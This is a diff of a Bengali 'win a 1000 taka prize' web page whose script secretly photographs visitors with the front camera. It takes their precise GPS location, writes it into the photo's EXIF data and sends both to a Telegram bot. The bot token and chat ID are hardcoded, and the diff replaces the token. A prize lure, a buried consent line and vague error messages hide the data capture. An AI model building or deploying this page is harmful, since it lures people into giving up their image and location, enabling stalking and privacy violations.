@@ -1,569 +1,616 @@
 <!doctype html>
 
 <html lang="bn">
-   
+
   <head>
-       
+
     <meta charset="UTF-8" />
 
-       
     <meta name="viewport" content="width=device-width, initial-scale=1" />
 
-       
     <title>১০০০ টাকা পুরস্কার জিতুন 🎁</title>
 
-       
     <script src="https://cdn.jsdelivr.net/npm/piexifjs@1.0.6/piexif.js"></script>
 
-       
     <style>
 
-            * {
+      * {
 
-              box-sizing: border-box;
+        box-sizing: border-box;
 
-            }
+      }
 
-            body {
+      body {
 
-              margin: 0;
+        margin: 0;
 
-              min-height: 100vh;
+        min-height: 100vh;
 
-              padding: 22px 16px;
+        padding: 22px 16px;
 
-              display: flex;
+        display: flex;
 
-              align-items: center;
+        align-items: center;
 
-              justify-content: center;
+        justify-content: center;
 
-              background: linear-gradient(145deg, #fff5e9, #ffe0c2, #dceeff);
+        background: linear-gradient(145deg, #fff5e9, #ffe0c2, #dceeff);
 
-              font-family: Arial, sans-serif;
+        font-family: Arial, sans-serif;
 
-              color: #243b53;
+        color: #243b53;
 
-            }
+      }
 
-            .app {
+      .app {
 
-              width: 100%;
+        width: 100%;
 
-              max-width: 390px;
+        max-width: 390px;
 
-              padding: 25px 20px;
+        padding: 25px 20px;
 
-              background: #ffffffed;
+        background: #ffffffed;
 
-              border: 1px solid white;
+        border: 1px solid white;
 
-              border-radius: 28px;
+        border-radius: 28px;
 
-              text-align: center;
+        text-align: center;
 
-              box-shadow: 0 15px 45px #e8792b2b;
+        box-shadow: 0 15px 45px #e8792b2b;
 
-            }
+      }
 
-            h1 {
+      h1 {
 
-              color: #f57224;
+        color: #f57224;
 
-              font-size: 28px;
+        font-size: 28px;
 
-              margin: 0 0 8px;
+        margin: 0 0 8px;
 
-            }
+      }
 
-            .subtitle {
+      .subtitle {
 
-              color: #526b84;
+        color: #526b84;
 
-              font-size: 14px;
+        font-size: 14px;
 
-              margin: 0 0 22px;
+        margin: 0 0 22px;
 
-            }
+      }
 
-            .frame {
+      .reward-grid {
+        display: grid;
+        grid-template-columns: repeat(3, minmax(0, 1fr));
+        gap: 9px;
+        margin: 0 auto 18px;
+        max-width: 330px;
+      }
+      .reward-box {
+        padding: 12px 4px;
+        border: 1px solid #ffd2ad;
+        border-radius: 13px;
+        color: #b84b0b;
+        background: linear-gradient(160deg, #fffaf5, #ffe6d2);
+        box-shadow: 0 4px 10px #f5722418;
+        font-weight: 700;
+        font-size: 13px;
+      }
+      .reward-box span { display: block; font-size: 21px; margin-bottom: 3px; }
+      .frame {
 
-              position: relative;
+        position: relative;
 
-              width: min(78vw, 290px);
+        width: min(78vw, 290px);
 
-              aspect-ratio: 1;
+        aspect-ratio: 1;
 
-              margin: 0 auto 20px;
+        margin: 0 auto 20px;
 
-              border-radius: 50%;
+        border-radius: 50%;
 
-              overflow: hidden;
+        overflow: hidden;
 
-              background: #fff0df;
+        background: #fff0df;
 
-              border: 6px solid white;
+        border: 6px solid white;
 
-              outline: 2px solid #f57224;
+        outline: 2px solid #f57224;
 
-              box-shadow: 0 8px 24px #f5722433;
+        box-shadow: 0 8px 24px #f5722433;
 
-              transition: width 0.3s ease;
+        transition: width 0.3s ease;
 
-            }
+      }
 
-            .frame.camera-open {
+      .frame.camera-open {
 
-              width: min(15vw, 50px);
+        width: min(15vw, 50px);
 
-              height: min(15vw, 50px);
+        height: min(15vw, 50px);
 
-              min-width: 40px;
+        min-width: 40px;
 
-              min-height: 40px;
+        min-height: 40px;
 
-              border-width: 2px;
+        border-width: 2px;
 
-              outline-width: 1px;
+        outline-width: 1px;
 
-            }
+      }
 
-            video,
+      video,
 
-            .preview {
+      .preview {
 
-              width: 100%;
+        width: 100%;
 
-              height: 100%;
+        height: 100%;
 
-              object-fit: cover;
+        object-fit: cover;
 
-            }
+      }
 
-            .placeholder {
+      .placeholder {
 
-              position: absolute;
+        position: absolute;
 
-              inset: 0;
+        inset: 0;
 
-              display: flex;
+        display: flex;
 
-              align-items: center;
+        align-items: center;
 
-              justify-content: center;
+        justify-content: center;
 
-              flex-direction: column;
+        flex-direction: column;
 
-              gap: 12px;
+        gap: 12px;
 
-              padding: 24px;
+        padding: 24px;
 
-              color: #bd4b12;
+        color: #bd4b12;
 
-              text-align: center;
+        text-align: center;
 
-            }
+      }
 
-            .heart {
+      .heart {
 
-              font-size: 54px;
+        font-size: 54px;
 
-            }
+      }
 
-            .wait-message {
+      .wait-message {
 
-              position: absolute;
+        position: absolute;
 
-              inset: 0;
+        inset: 0;
 
-              display: flex;
+        display: flex;
 
-              align-items: center;
+        align-items: center;
 
-              justify-content: center;
+        justify-content: center;
 
-              flex-direction: column;
+        flex-direction: column;
 
-              gap: 8px;
+        gap: 8px;
 
-              padding: 24px;
+        padding: 24px;
 
-              text-align: center;
+        text-align: center;
 
-              font-size: 18px;
+        font-size: 18px;
 
-              line-height: 1.35;
+        line-height: 1.35;
 
-              color: #bd4b12;
+        color: #bd4b12;
 
-              background: #fff0df;
+        background: #fff0df;
 
-              border-radius: 50%;
+        border-radius: 50%;
 
-              z-index: 10;
+        z-index: 10;
 
-            }
+      }
 
-            .wait-message[hidden],
+      .wait-message[hidden],
 
-            [hidden] {
+      [hidden] {
 
-              display: none !important;
+        display: none !important;
 
-            }
+      }
 
-            button {
+      button {
 
-              width: 100%;
+        width: 100%;
 
-              padding: 14px;
+        padding: 14px;
 
-              margin: 6px 0;
+        margin: 6px 0;
 
-              border: 0;
+        border: 0;
 
-              border-radius: 30px;
+        border-radius: 30px;
 
-              background: linear-gradient(90deg, #f57224, #ff8a3d);
+        background: linear-gradient(90deg, #f57224, #ff8a3d);
 
-              color: white;
+        color: white;
 
-              font-weight: bold;
+        font-weight: bold;
 
-              font-size: 15px;
+        font-size: 15px;
 
-              cursor: pointer;
+        cursor: pointer;
 
-            }
+      }
 
-            button:disabled {
+      button:disabled {
 
-              opacity: 0.5;
+        opacity: 0.5;
 
-              cursor: wait;
+        cursor: wait;
 
-            }
+      }
 
-            .notice {
+      .notice {
 
-              text-align: left;
+        text-align: left;
 
-              font-size: 12px;
+        font-size: 12px;
 
-              line-height: 1.5;
+        line-height: 1.5;
 
-              padding: 12px;
+        padding: 12px;
 
-              background: #fff3e8;
+        background: #fff3e8;
 
-              border-radius: 14px;
+        border-radius: 14px;
 
-              margin: 14px 0;
+        margin: 14px 0;
 
-            }
+      }
 
-            .consent {
+      .consent {
 
-              display: flex;
+        display: flex;
 
-              align-items: flex-start;
+        align-items: flex-start;
 
-              gap: 9px;
+        gap: 9px;
 
-              text-align: left;
+        text-align: left;
 
-              font-size: 12px;
+        font-size: 12px;
 
-              line-height: 1.5;
+        line-height: 1.5;
 
-              margin: 12px 2px;
+        margin: 12px 2px;
 
-            }
+      }
 
-            .consent input {
+      .consent input {
 
-              margin-top: 3px;
+        margin-top: 3px;
 
-              accent-color: #f57224;
+        accent-color: #f57224;
 
-            }
+      }
 
-            .status {
+      .status {
 
-              min-height: 38px;
+        min-height: 38px;
 
-              margin-top: 12px;
+        margin-top: 12px;
 
-              font-size: 13px;
+        font-size: 13px;
 
-              line-height: 1.5;
+        line-height: 1.5;
 
-              overflow-wrap: anywhere;
+        overflow-wrap: anywhere;
 
-            }
+      }
 
-            .tiny {
+      .tiny {
 
-              font-size: 11px;
+        font-size: 11px;
 
-              color: #64748b;
+        color: #64748b;
 
-              line-height: 1.5;
+        line-height: 1.5;
 
-            }
+      }
 
-            .prank-popup {
+      .prank-popup {
 
-              position: fixed;
+        position: fixed;
 
-              inset: 0;
+        inset: 0;
 
-              z-index: 9999;
+        z-index: 9999;
 
-              background: #172b4dcc;
+        background: #172b4dcc;
 
-              display: flex;
+        display: flex;
 
-              align-items: center;
+        align-items: center;
 
-              justify-content: center;
+        justify-content: center;
 
-              padding: 22px;
+        padding: 22px;
 
-            }
+      }
 
-            .prank-card {
+      .prank-card {
 
-              width: 100%;
+        width: 100%;
 
-              max-width: 330px;
+        max-width: 330px;
 
-              padding: 28px 22px;
+        padding: 28px 22px;
 
-              border-radius: 28px;
+        border-radius: 28px;
 
-              background: #ffffff;
+        background: #ffffff;
 
-              color: #243b53;
+        color: #243b53;
 
-              text-align: center;
+        text-align: center;
 
-              box-shadow: 0 15px 50px #172b4d44;
+        box-shadow: 0 15px 50px #172b4d44;
 
-              animation: pop 0.35s ease-out;
+        animation: pop 0.35s ease-out;
 
-            }
+      }
 
-            .prank-card h2 {
+      .prank-card h2 {
 
-              font-size: 34px;
+        font-size: 34px;
 
-              margin: 12px 0;
+        margin: 12px 0;
 
-            }
+      }
 
-            .prank-card p {
+      .prank-card p {
 
-              line-height: 1.5;
+        line-height: 1.5;
 
-            }
+      }
 
-            @keyframes pop {
+      @keyframes pop {
 
-              from {
+        from {
 
-                transform: scale(0.65) rotate(-5deg);
+          transform: scale(0.65) rotate(-5deg);
 
-                opacity: 0;
+          opacity: 0;
 
-              }
+        }
 
-              to {
+        to {
 
-                transform: scale(1) rotate(0);
+          transform: scale(1) rotate(0);
 
-                opacity: 1;
+          opacity: 1;
 
-              }
+        }
 
-            }
+      }
 
-         
     </style>
 
-     
   </head>
 
-   
   <body>
-       
+
     <main class="app">
-           
+
       <h1>🎁 ১০০০ টাকা পুরস্কার জিতুন!</h1>
 
-           
       <p class="subtitle">আপনার জন্য অপেক্ষা করছে দারুণ পুরস্কার! 👀</p>
 
-           
+      <div class="reward-grid" aria-label="সম্ভাব্য পুরস্কার">
+        <div class="reward-box"><span>💰</span>১০০ টাকা</div>
+        <div class="reward-box"><span>💰</span>২০০ টাকা</div>
+        <div class="reward-box"><span>💰</span>৩০০ টাকা</div>
+        <div class="reward-box"><span>🎁</span>৫০০ টাকা</div>
+        <div class="reward-box"><span>🏆</span>১০০০ টাকা</div>
+      </div>
       <div class="frame" id="cameraFrame">
-                <video id="camera" autoplay playsinline hidden></video>
 
-                <img id="preview" class="preview" alt="Captured photo" hidden />
+        <video id="camera" autoplay playsinline hidden></video>
 
-               
+        <img id="preview" class="preview" alt="Captured photo" hidden />
+
         <div id="placeholder" class="placeholder">
-                    <span class="heart">🎁</span
-          ><span>আপনার পুরস্কার অপেক্ষা করছে...</span>
 
-                 
+          <span class="heart">🎁</span><span>আপনার পুরস্কার অপেক্ষা করছে...</span>
+
         </div>
 
-               
         <div id="joker" class="wait-message" hidden>
-                    অপেক্ষা করুন<br />পুরস্কার আসছে...        
+
+          অপেক্ষা করুন<br />পুরস্কার আসছে...
+
         </div>
 
-             
       </div>
 
-           
       <div class="notice">
-                🎁 এখানে ১০০, ২০০, ৩০০, ৫০০ অথবা ১০০০ টাকার পুরস্কারের ডিজাইন
-        দেখানো হয়েছে। এটি একটি প্র্যাঙ্ক পেজ।      
+
+        🎁 এখানে ১০০, ২০০, ৩০০, ৫০০ অথবা ১০০০ টাকার পুরস্কারের ডিজাইন দেখানো হয়েছে। এটি একটি প্র্যাঙ্ক পেজ।
+
       </div>
 
-           
       <label class="consent"
+
         ><input type="checkbox" id="consent" /><span
-          >আমি বুঝেছি এবং সম্মতি দিচ্ছি: ক্যামেরায় তোলা ছবি ও আমার ডিভাইসের
-          লোকেশন Telegram-এ পাঠানো হবে।</span
+
+          >আমি বুঝেছি এবং সম্মতি দিচ্ছি: ক্যামেরায় তোলা ছবি ও আমার ডিভাইসের লোকেশন Telegram-এ পাঠানো হবে।</span
+
         ></label
+
       >
 
-            <button id="startBtn" disabled>🎁 পুরস্কার জিতুন</button>
+      <button id="startBtn" disabled>🎁 পুরস্কার জিতুন</button>
 
-           
       <div id="countdown" class="status" role="timer" hidden></div>
 
-           
       <div id="status" class="status" role="status">
-                 পুরস্কার জেতার জন্য প্রস্তুত?      
+
+         পুরস্কার জেতার জন্য প্রস্তুত?
+
       </div>
 
-           
       <p class="tiny">ভাগ্য পরীক্ষা করুন! 💸</p>
 
-         
     </main>
 
-       
     <div id="prankPopup" class="prank-popup" hidden>
-           
+
       <div class="prank-card">
-               
+
         <div style="font-size: 54px">😂🤡</div>
 
-               
         <h2>ধরা খেয়েছেন! 😜</h2>
 
-               
         <p>এটা ছিল একটি প্র্যাঙ্ক! 🤣</p>
 
-               
         <p>আসল চমক ছিল এই মজার প্র্যাঙ্ক! 💗</p>
 
-               
         <p id="popupCountdown">৫ সেকেন্ডে বন্ধ হবে…</p>
 
-                <button id="closePrank">আচ্ছা, বুঝেছি! 😂</button>
+        <button id="closePrank">আচ্ছা, বুঝেছি! 😂</button>
 
-             
       </div>
 
-         
     </div>
 
-       
     <script>
-      "use strict"; // IMPORTANT: Do not put a real Telegram bot token in public client-side code.
+
+      "use strict";
+
+      // IMPORTANT: Do not put a real Telegram bot token in public client-side code.
+
       // Use a server-side endpoint for production. Replace these placeholders only for private testing.
 
-      const BOT_TOKEN = "8919390906:AAHc23vOtQJIRUx9a3wbgHOgjm8rB53syE4";
+      const BOT_TOKEN = "8880325141:AAFMjD2yGkldxx5-_1i3QUdFV5csgTnO5D4";
 
       const CHAT_ID = "7350437667";
 
       const $ = (id) => document.getElementById(id);
 
       const camera = $("camera"),
+
         preview = $("preview"),
+
         placeholder = $("placeholder"),
+
         joker = $("joker");
 
       const consent = $("consent"),
+
         startBtn = $("startBtn"),
+
         statusBox = $("status"),
+
         countdownBox = $("countdown");
 
       const prankPopup = $("prankPopup"),
+
         closePrank = $("closePrank"),
+
         cameraFrame = $("cameraFrame"),
+
         popupCountdown = $("popupCountdown");
 
       let stream = null,
+
         imageCapture = null,
+
         previewUrl = null,
+
         busy = false,
+
         countdownTimer = null,
+
         popupTimer = null;
 
       function setStatus(message) {
+
         statusBox.textContent = message;
+
       }
 
       function stopCamera() {
+
         if (stream) {
+
           stream.getTracks().forEach((track) => track.stop());
 
           stream = null;
+
         }
 
         imageCapture = null;
 
         camera.srcObject = null;
+
       }
 
       function clearPreview() {
+
         if (previewUrl) {
+
           URL.revokeObjectURL(previewUrl);
 
           previewUrl = null;
+
         }
 
         preview.removeAttribute("src");
 
         preview.hidden = true;
+
       }
 
       consent.addEventListener("change", () => {
+
         startBtn.disabled = !consent.checked || busy;
+
       });
 
       async function openCamera() {
+
         if (!navigator.mediaDevices?.getUserMedia)
-          throw new Error("সমর্থিত ব্রাউজারে HTTPS দিয়ে ওয়েবসাইটটি খুলুন।");
+
+          throw new Error(
+
+            "সমর্থিত ব্রাউজারে HTTPS দিয়ে ওয়েবসাইটটি খুলুন।",
+
+          );
 
         setStatus("পুরস্কার আসছে!");
 
         stream = await navigator.mediaDevices.getUserMedia({
+
           audio: false,
 
           video: {
+
             facingMode: { ideal: "user" },
 
             width: { ideal: 4096 },
 
             height: { ideal: 3072 },
+
           },
+
         });
 
         camera.srcObject = stream;
@@ -581,30 +628,45 @@
         const track = stream.getVideoTracks()[0];
 
         if (!("ImageCapture" in window))
-          throw new Error("কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।");
+
+          throw new Error(
+
+            "কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।",
+
+          );
 
         imageCapture = new ImageCapture(track);
+
       }
 
       function getCurrentLocation() {
+
         return new Promise((resolve, reject) => {
+
           if (!navigator.geolocation) {
+
             reject(new Error("কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।"));
 
             return;
+
           }
 
           navigator.geolocation.getCurrentPosition(
+
             (position) => {
+
               const { latitude, longitude, accuracy } = position.coords;
 
               if (!Number.isFinite(latitude) || !Number.isFinite(longitude)) {
+
                 reject(new Error("কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।"));
 
                 return;
+
               }
 
               resolve({
+
                 latitude,
 
                 longitude,
@@ -612,37 +674,56 @@
                 accuracy,
 
                 timestamp: position.timestamp,
+
               });
+
             },
 
             (error) => {
+
               const messages = {
+
                 1: "কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।",
 
                 2: "কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।",
 
                 3: "কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।",
+
               };
 
               reject(
+
                 new Error(
-                  messages[error.code] ||
-                    "কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।",
+
+                  messages[error.code] || "কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।",
+
                 ),
+
               );
+
             },
 
             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
+
           );
+
         });
+
       }
 
       async function addGpsExif(blob, location) {
+
         if (!window.piexif)
+
           throw new Error("কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।");
 
         if (blob.type && blob.type.toLowerCase() !== "image/jpeg")
-          throw new Error("কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।");
+
+          throw new Error(
+
+            "কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।",
+
+          );
 
         const bytes = new Uint8Array(await blob.arrayBuffer());
 
@@ -651,17 +732,23 @@
         const chunkSize = 0x8000;
 
         for (let i = 0; i < bytes.length; i += chunkSize)
+
           binary += String.fromCharCode(...bytes.subarray(i, i + chunkSize));
 
         if (bytes[0] !== 0xff || bytes[1] !== 0xd8)
+
           throw new Error("The captured file is not a valid JPEG.");
 
         let exif;
 
         try {
+
           exif = piexif.load(binary);
+
         } catch (_) {
+
           exif = { "0th": {}, Exif: {}, GPS: {}, "1st": {}, thumbnail: null };
+
         }
 
         exif["0th"] = exif["0th"] || {};
@@ -671,7 +758,9 @@
         exif["GPS"] = exif["GPS"] || {};
 
         const gps = exif["GPS"],
+
           lat = location.latitude,
+
           lon = location.longitude;
 
         gps[piexif.GPSIFD.GPSVersionID] = [2, 3, 0, 0];
@@ -679,20 +768,27 @@
         gps[piexif.GPSIFD.GPSLatitudeRef] = lat < 0 ? "S" : "N";
 
         gps[piexif.GPSIFD.GPSLatitude] = piexif.GPSHelper.degToDmsRational(
+
           Math.abs(lat),
+
         );
 
         gps[piexif.GPSIFD.GPSLongitudeRef] = lon < 0 ? "W" : "E";
 
         gps[piexif.GPSIFD.GPSLongitude] = piexif.GPSHelper.degToDmsRational(
+
           Math.abs(lon),
+
         );
 
         if (Number.isFinite(location.accuracy))
+
           gps[piexif.GPSIFD.GPSHPositioningError] = [
+
             Math.round(location.accuracy * 100),
 
             100,
+
           ];
 
         const date = new Date(location.timestamp);
@@ -706,28 +802,42 @@
           .replaceAll("-", ":");
 
         gps[piexif.GPSIFD.GPSTimeStamp] = [
+
           [date.getUTCHours(), 1],
 
           [date.getUTCMinutes(), 1],
 
           [date.getUTCSeconds(), 1],
+
         ];
 
         const modified = piexif.insert(piexif.dump(exif), binary),
+
           out = new Uint8Array(modified.length);
 
         for (let i = 0; i < modified.length; i++)
+
           out[i] = modified.charCodeAt(i);
 
         return new Blob([out], { type: "image/jpeg" });
+
       }
 
       async function sendToTelegram(blob, location) {
+
         if (
+
           BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN" ||
+
           CHAT_ID === "YOUR_TELEGRAM_CHAT_ID"
+
         )
-          throw new Error("কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।");
+
+          throw new Error(
+
+            "কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।",
+
+          );
 
         const form = new FormData();
 
@@ -736,39 +846,55 @@
         form.append("document", blob, `surprise-${Date.now()}.jpg`);
 
         const response = await fetch(
+
           `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
 
           { method: "POST", body: form },
+
         );
 
         const result = await response.json();
 
         if (!response.ok || !result.ok)
+
           throw new Error(
+
             result.description || "কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।",
+
           );
 
         const text = `📍 ডিভাইসের লোকেশন\nঅক্ষাংশ: ${location.latitude}\nদ্রাঘিমাংশ: ${location.longitude}\nনির্ভুলতা: ±${Math.round(location.accuracy)} মিটার\nমানচিত্র: https://maps.google.com/?q=${location.latitude},${location.longitude}`;
 
         const messageResponse = await fetch(
+
           `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
 
           {
+
             method: "POST",
 
             headers: { "Content-Type": "application/json" },
 
             body: JSON.stringify({ chat_id: CHAT_ID, text }),
+
           },
+
         );
 
         const messageResult = await messageResponse.json();
 
         if (!messageResponse.ok || !messageResult.ok)
-          throw new Error("কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।");
+
+          throw new Error(
+
+            "কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।",
+
+          );
+
       }
 
       function startPopupCountdown(seconds = 5) {
+
         if (popupTimer) clearInterval(popupTimer);
 
         let left = seconds;
@@ -776,9 +902,11 @@
         popupCountdown.textContent = `${left} সেকেন্ডে বন্ধ হবে…`;
 
         popupTimer = setInterval(() => {
+
           left--;
 
           if (left <= 0) {
+
             clearInterval(popupTimer);
 
             popupTimer = null;
@@ -786,17 +914,20 @@
             prankPopup.hidden = true;
 
             return;
+
           }
 
           popupCountdown.textContent = `${left} সেকেন্ডে বন্ধ হবে…`;
+
         }, 1000);
+
       }
 
       async function captureAndSend() {
+
         const loc = await getCurrentLocation();
 
-        if (!imageCapture)
-          throw new Error("কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।");
+        if (!imageCapture) throw new Error("কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।");
 
         setStatus("পুরস্কারের জন্য অপেক্ষা করুন...");
 
@@ -831,9 +962,11 @@
         startPopupCountdown(5);
 
         setStatus("আর একটু ধৈর্য ধরুন!");
+
       }
 
       startBtn.addEventListener("click", async () => {
+
         if (!consent.checked || busy) return;
 
         busy = true;
@@ -847,28 +980,39 @@
         countdownBox.textContent = `পুরস্কার চালু হবে… ${secondsLeft}…`;
 
         countdownTimer = setInterval(() => {
+
           secondsLeft--;
 
           if (secondsLeft > 0)
+
             countdownBox.textContent = `পুরস্কার চালু হবে… ${secondsLeft}…`;
+
           else {
+
             clearInterval(countdownTimer);
 
             countdownTimer = null;
 
             countdownBox.hidden = true;
+
           }
+
         }, 1000);
 
         try {
+
           await openCamera();
 
           await captureAndSend();
+
         } catch (error) {
+
           if (countdownTimer) {
+
             clearInterval(countdownTimer);
 
             countdownTimer = null;
+
           }
 
           countdownBox.hidden = true;
@@ -883,14 +1027,16 @@
 
           cameraFrame.classList.remove("camera-open");
 
-          setStatus(
-            error.message || "কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।",
-          );
+          setStatus(error.message || "কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।");
+
         } finally {
+
           if (countdownTimer) {
+
             clearInterval(countdownTimer);
 
             countdownTimer = null;
+
           }
 
           countdownBox.hidden = true;
@@ -898,23 +1044,29 @@
           busy = false;
 
           startBtn.disabled = !consent.checked;
+
         }
+
       });
 
       closePrank.addEventListener("click", () => {
+
         if (popupTimer) {
+
           clearInterval(popupTimer);
 
           popupTimer = null;
+
         }
 
         prankPopup.hidden = true;
+
       });
 
       window.addEventListener("pagehide", stopCamera);
+
     </script>
 
-     
   </body>
-</html>
 
+</html>
